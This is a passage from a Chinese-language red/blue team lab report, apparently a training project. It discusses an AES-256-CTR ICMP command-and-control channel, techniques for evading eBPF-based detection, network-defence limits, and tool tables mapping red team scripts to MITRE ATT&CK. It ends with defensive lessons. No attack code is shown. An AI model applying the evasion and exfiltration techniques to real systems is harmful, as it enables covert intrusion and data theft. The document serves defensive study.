### 7.1 AES-256-CTR 的安全性

**強度**:
- AES-256 有 2^256 key space，暴力破解不實際
- CTR mode 的 random IV 提供 semantic security
- 用 OpenSSL libcrypto 實作，這個 library 有很多人 audit 過

**要注意的地方**:
- CTR mode 沒有 **integrity protection**（不像 GCM mode）
- IV 如果重複的話安全性就會掉（我們用 `os.urandom(16)` 來確保 randomness）
- 如果需要 integrity，建議改用 AES-256-GCM 或 ChaCha20-Poly1305

### 7.2 ICMP 通道的頻寬限制
- 每個 ICMP 封包 payload 大概 480 bytes
- 加上 jitter delay，實際 throughput 很低
- 不適合大量 data exfiltration，比較適合 command/control
- 要大量外傳資料的話得改用 DNS/ICMP exfil channel（`exfil_agent.py`）

### 7.3 eBPF 偵測的繞過可能
- 攻擊者可以用 `shm_open()` 代替 `memfd_create`（要多加一個 hook）
- 可以用 `fexecve()` 代替 execve + /proc 路徑
- 更進階的話: 用 `ptrace` inject 到已有的 process（不需要 execve）
- 反向 Shell 可以走 non-standard port（不過 dup2/dup3 行為偵測還是有用）
- 解法: 繼續加 hook 點，或結合 seccomp-BPF 跟 LSM hook

### 7.4 網路層防禦的限制
- IP 封鎖可以透過 IP alias、VPN、proxy 繞過
- 蜜罐只能偵測主動偵察
- 解法: 配合 eBPF kernel-level 偵測做 defense-in-depth

### 7.5 Lab 環境 vs 實際環境
- 這個 Lab 假設 Flask 跑在 root 底下（這樣 ICMP raw socket 才有 CAP_NET_RAW）
- 實際上 Web service 通常會用低權限 user 跑
- ICMP raw socket 在實際環境中需要額外做 privilege escalation
- 我們刻意沒做 privilege escalation 跟 destructive operation（Impact），把 blast radius 控制住

---

## 8. 工具清單

### 紅軍工具

| 工具 | 檔案路徑 | 用途 | MITRE ATT&CK |
|------|---------|------|-------------|
| Fileless ICMP C2 | `red_team/red_attacker.py` | 主攻擊：SSTI → memfd → AES-256-CTR ICMP C2 | T1190, T1620, T1095, T1027 |
| TCP Reverse Shell | `red_team/red_reverse_shell.py` | eBPF v1 繞過：TCP 反向 Shell | T1059.006, T1095, T1571 |
| WAF Bypass Exploit | `red_team/exploit.py` | 備用：Base64 + ${IFS} WAF bypass | T1190, T1027 |
| Exfil Agent | `red_team/exfil_agent.py` | 靶機端：資料蒐集 + DNS/ICMP 外傳 | T1005, T1048.003 |
| Exfil Listener | `red_team/exfil_listener.py` | 攻擊機端：DNS/ICMP 資料接收 | T1048.003 |
| Recon Script | `red_team/recon.sh` | nmap 自動化偵察 | T1595 |
| IP Switch | `red_team/ip_switch.sh` | IP alias 管理（繞過網路 MDR） | Defense Evasion |
| Deploy Agent | `red_team/deploy_agent.sh` | 一鍵產生 exfil agent 部署指令 | T1059.006 |
| Post-Exploit | `red_team/post_exploit.sh` | 後滲透情報蒐集 | T1082 |

### 藍軍工具

| 工具 | 檔案路徑 | 用途 | 偵測層級 |
|------|---------|------|---------|
| eBPF MDR v1 | `blue_team/blue_ebpf_mdr.py` | 3 hook: memfd_create + execve + socket | 核心層 |
| eBPF MDR v2 | `blue_team/blue_ebpf_mdr_v2.py` | 6 hook: v1 + connect + dup2 + dup3 | 核心層 |
| Network MDR | `blue_team/blue_mdr_network.py` | trap.log 監控 + iptables 自動封鎖 | 網路層 |
| SOC Dashboard | `blue_team/soc_dashboard.py` | 即時 SOC 網頁儀表板 (SSE) | 可視化 |

### 靶機/誘餌

| 工具 | 檔案路徑 | 用途 | Port |
|------|---------|------|------|
| Vulnerable API | `target/target_app.py` | Flask SSTI 漏洞服務 | 9999 |
| SSH Honeypot | `target/honeypot.py` | 假 SSH 蜜罐 | 2222 |

---

## 9. 結論

這個專案做了一個多回合的 Kill Chain 攻防演練，從偵察一路到資料外洩，防禦方面也從網路層的欺敵做到 kernel-level 的行為偵測。幾個比較重要的觀察：

1. **單一防禦不夠用**: 網路層防禦（蜜罐 + 防火牆）換個 IP 就繞過了；eBPF v1 也是用不同的 syscall 就能繞。要多個獨立的偵測機制一起配合才比較穩。

2. **紅隊會 adapt，藍隊也得跟上**: eBPF v1 擋住了無檔案 ICMP C2 之後，紅隊就改用 TCP 反向 Shell，完全不碰被 monitor 的 syscall。藍隊就得升級到 eBPF v2 加上 `connect()` 跟 `dup2()`/`dup3()` 的 hook 來應對。這個你來我往的過程就是實際 security operation 的樣子。

3. **行為偵測不怕加密**: C2 channel 從 XOR 升到 AES-256-CTR 之後 payload inspection 是完全不可能了，但 eBPF 偵測照樣有效，因為它看的是 syscall 行為（process 做了什麼事），不是在看 traffic content。

4. **統一的可視化有幫助**: SOC 儀表板把所有防禦元件的事件集中起來，讓藍隊可以看到整個 attack picture，不用一個一個 alert 去看。

5. **無檔案技術很難用傳統方法偵測**: 用 `memfd_create` 全程在記憶體裡執行，disk 上完全沒痕跡。這也是為什麼需要 eBPF 這種 kernel-level 的行為監控。

6. **Covert channel 到處都是**: ICMP、DNS 這些看起來很正常的協定都可以拿來當 C2 或 exfiltration channel。防禦不能只看 TCP/UDP 那層。

整個專案實作了 15 項 MITRE ATT&CK 攻擊技術（涵蓋 7 個 tactic），防禦方面有橫跨網路層跟核心層的 7 項偵測能力，在受控的 lab 環境裡跑了一遍完整的攻防流程。
